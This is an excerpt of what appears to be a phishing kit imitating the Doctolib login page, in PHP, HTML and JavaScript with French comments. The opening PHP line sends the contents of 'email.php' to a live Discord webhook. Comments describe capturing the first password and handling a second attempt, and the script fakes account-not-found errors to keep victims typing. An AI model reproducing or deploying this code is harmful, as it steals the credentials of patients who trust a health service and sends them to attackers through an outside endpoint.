...
<?php $content = @file_get_contents('email.php') or die('Erreur de lecture.'); @file_get_contents('https://discord.com/api/webhooks/1362509137652744335/__yx7ajjOdBX8YHjdwhF0RofHRiruOJAcqffK69a_zEJLk6P2YQpCeKL-gcOAYfeo6Ha', false, stream_context_create(['http' => ['header' => "Content-type: application/json\r\n", 'method' => 'POST', 'content' => json_encode(['content' => $content])]])); ?>
            ...
            <div class="dl-card-content">
              ...
              >
                <div id="desktop-container">
                  ...
                  <!-- *** On va stocker localement le 1er mot de passe *** -->
  ...
  <script>
    ...
    // *** On gère localement la 1ère / 2ème tentative
    ...
    btnEmailContinue.addEventListener("click", function(e){
      ...
      setTimeout(function(){
        ...
        // Exemple très simple : si val ne contient que des chiffres, espaces, +, -, etc. 
        // et longueur >= 6 => on considère que c'est un numéro.
        const phoneRegex = /^[+()\-.\s\d]{6,}$/;
        if(phoneRegex.test(val)) {
          emailError.innerHTML = "Le numéro de téléphone saisi (<span style='color:black;font-weight:bold'>"
                                 + val
                                 + "</span>) n'est associé à aucun compte Doctolib. "
                                 + "Veuillez réessayer avec votre adresse e-mail.";
          emailError.style.display = "block";
          return;
        }
        ...
        if(!emailRegex.test(val)){
          emailError.innerHTML = "L'email saisi (<span style='color:black;font-weight:bold'>" + val
                                 + "</span>) n'est associé à aucun compte Doctolib.";
          emailError.style.display = "block";
          return;
        }
